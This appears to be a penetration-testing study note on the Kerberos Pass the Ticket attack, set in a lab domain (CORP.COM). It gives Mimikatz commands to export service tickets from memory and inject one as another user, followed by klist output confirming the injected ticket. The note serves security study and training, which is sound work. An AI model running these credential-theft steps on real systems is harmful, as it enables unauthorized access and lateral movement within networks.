We can only use the TGT on the machine it was created for, but the `TGS` potentially offers more flexibility.
The [[Pass the Ticket]] attack takes advantage of the `TGS`, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

```mimikatz
privilege::debug
sekurlsa::tickets /export
```
```powershell
# Check the username & hostname (It generates a lot of tickets so use any one of them)
dir *.kirbi
```
```mimikatz
# Select any one of the kirbi
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
```
```powershell
# Check for tickets (Highlight on client & server)
klist

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 9/14/2022 5:31:32 (local)
        End Time:   9/14/2022 15:31:13 (local)
        Renew Time: 9/21/2022 5:31:13 (local)
```